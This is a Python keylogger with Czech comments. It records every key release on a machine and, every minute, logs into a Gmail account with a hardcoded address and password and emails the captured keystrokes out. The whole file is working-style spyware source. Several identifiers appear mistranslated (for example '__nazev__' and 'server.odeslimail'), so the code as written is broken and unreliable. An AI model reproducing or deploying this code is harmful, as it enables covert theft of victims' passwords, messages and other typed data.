import keyboard                                 #pro keylogy
import smtplib                                  #nacteni knihovny pro odesilani emailu prostrednictvim SMTP protokolu (gmail)
from threading import Semaphore,Timer           #Semaphore blokuje aktuální vlakna, Timerem vytvořím intervaly, ve kterých se data budou posílat na mail

POSLI_REPORT_KAZDYCH = 60      #1 minuta
Email_adresa = "klogger1661@gmail.com"
Email_heslo = "klogger*10"

class Keylogger:
    def __init__(self,interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self,udalost):
        #slouzi k zaznamu jakekoliv udalosti na klavesnici (treba pusteni klavesy)
        nazev = udalost.nazev
        if len(nazev) > 1:
            #tady jeste neresim specialni znaky (ctrl, alt, shift atd.)
            if nazev == "space":
                                                                    # " " namisto "space"
                nazev = " "
            elif nazev == "enter":
                                                                    #prida novy radek pokazde, kdyz se zmackne enter
                nazev = "[ENTER]\n"
            elif nazev == "decimalni":
                nazev = "."
            else:
                #mezery nahradime podtrzitkama
                nazev = nazev.replace(" ","_")
                nazev = f"[{nazev.upper()}]"
        self.log += nazev                                           #pokazde kdyz se pusti nejaka klavesa, tak se stisknute tlacitko ulozi do self.log jako string

    def odeslimail(self,email,heslo,zprava):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)      #nastavime pripojeni k SMTP serveru
        server.starttls()                                           #pripojime se na SMTP server v TLS modu (z duvodu bezpecnosti)
        server.login(email,heslo)                                   #prihlaseni do mailu
        server.odeslimail(email,heslo,zprava)                       #odeslani dat
        server.quit()                                               #ukoncim relaci

    def report(self):
        #funkce mi zabezpeci to, ze se mail bude odesilat jen v nami stanovenem intervalu
        #vlastne vzdy odesle keylogy a zaroven resetuje self.log
        if self.log:
            #pokud bude neco v promenne self.log -> nahlasime to na mail
            self.odeslimail(Email_adresa, Email_heslo, self.log)
        self.log = ""
        Timer(interval=self.interval,function=self.report).start()

    def start(self):
        #start samotneho keyloggeru
        keyboard.on_release(callback = self.callback)
        #zacnu reportovat keylogy
        self.report()
        #blokuje aktualni vlakno (protoze pusteni ji uz neblokuje -> pusteni spustilo listener v dalsim vlaknu
        self.semaphore.acquire()

if __nazev__ == "__main__":
    keylogger = Keylogger(interval=POSLI_REPORT_KAZDYCH)
    keylogger.start()
